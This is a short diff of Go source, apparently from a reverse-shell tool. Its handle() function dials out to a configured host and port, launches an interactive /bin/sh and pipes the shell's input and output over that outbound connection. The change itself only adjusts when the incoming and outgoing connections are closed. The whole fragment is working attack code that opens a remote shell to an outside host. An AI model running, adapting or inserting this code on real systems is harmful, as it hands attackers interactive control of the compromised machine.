@@ -13,18 +13,20 @@ const (
 )
 
 func handle(conn net.Conn) {
-	defer conn.Close()
 
 	revConn, err := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
 	if err != nil {
 		log.Fatalln(err)
 	}
+	defer revConn.Close()
+
 	shell := exec.Command("/bin/sh", "-i")
 
 	shell.Stderr = revConn
 	shell.Stdin = revConn
 	shell.Stdout = revConn
 
+	conn.Close()
 	shell.Run()
 }
 
